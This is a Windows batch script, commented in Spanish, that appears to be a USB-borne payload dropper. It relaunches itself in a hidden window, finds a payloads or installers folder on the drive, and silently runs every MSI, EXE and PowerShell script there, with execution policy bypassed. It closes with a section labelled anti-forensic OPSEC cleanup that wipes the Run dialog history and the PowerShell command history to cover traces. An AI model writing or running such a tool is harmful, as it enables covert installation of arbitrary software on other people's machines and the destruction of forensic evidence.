@echo off

:: Ejecutarse en segundo plano si no lo esta
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit /b 0
)

:: ====================================================
::               RESOLUCION DINAMICA DE RUTAS
:: ====================================================
set "USB_ROOT=%~dp0"
if exist "%~dp0..\..\payloads" (
    for %%I in ("%~dp0..\..") do set "USB_ROOT=%%~fI\"
)

set "FOLDER_DATA=%USB_ROOT%Data"
if not exist "%FOLDER_DATA%" mkdir "%FOLDER_DATA%" 2>nul

set "LOG_FILE=%FOLDER_DATA%\install_%COMPUTERNAME%.log"

:: Localizar carpeta de instaladores (soporta variantes tanto en modulo local como en raiz del USB)
set "CARPETA_PROGS="
if exist "%~dp0CARPETA_PROGS" set "CARPETA_PROGS=%~dp0CARPETA_PROGS"
if exist "%~dp0programas" set "CARPETA_PROGS=%~dp0programas"
if exist "%~dp0installers" set "CARPETA_PROGS=%~dp0installers"
if "%CARPETA_PROGS%"=="" (
    if exist "%USB_ROOT%CARPETA_PROGS" set "CARPETA_PROGS=%USB_ROOT%CARPETA_PROGS"
    if exist "%USB_ROOT%programas" set "CARPETA_PROGS=%USB_ROOT%programas"
    if exist "%USB_ROOT%installers" set "CARPETA_PROGS=%USB_ROOT%installers"
)

if "%CARPETA_PROGS%"=="" (
    echo [%DATE% %TIME%] No se encontro carpeta de programas en %~dp0 ni en %USB_ROOT% >> "%LOG_FILE%"
    goto :cleanup
)

:: Parametro silencioso para ejecutables (.exe)
set "PARAM_SILENCIOSO=/S"

:: ====================================================
::        DETECCION E INSTALACION DINAMICA
:: ====================================================
echo [%DATE% %TIME%] Iniciando instalacion desde %CARPETA_PROGS% >> "%LOG_FILE%"

:: 1. Paquetes MSI
for %%F in ("%CARPETA_PROGS%\*.msi") do (
    echo [%DATE% %TIME%] Instalando MSI: %%~nxF >> "%LOG_FILE%"
    msiexec.exe /i "%%F" /qn /norestart
)

:: 2. Instaladores ejecutables (.exe)
for %%F in ("%CARPETA_PROGS%\*.exe") do (
    echo [%DATE% %TIME%] Ejecutando EXE: %%~nxF >> "%LOG_FILE%"
    start /wait "" "%%F" %PARAM_SILENCIOSO%
)

:: 3. Scripts de PowerShell (.ps1)
for %%F in ("%CARPETA_PROGS%\*.ps1") do (
    echo [%DATE% %TIME%] Ejecutando script PowerShell: %%~nxF >> "%LOG_FILE%"
    powershell -NoProfile -ExecutionPolicy Bypass -File "%%F"
)

echo [%DATE% %TIME%] Proceso de instalacion finalizado. >> "%LOG_FILE%"

:cleanup
:: ====================================================
::               LIMPIEZA ANTI-FORENSE (OPSEC)
:: ====================================================
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Get-Command Get-PSReadLineOption -ErrorAction SilentlyContinue) { $h = (Get-PSReadLineOption).HistorySavePath; if (Test-Path $h) { Clear-Content $h -Force -ErrorAction SilentlyContinue } }" >nul 2>&1

exit /b 0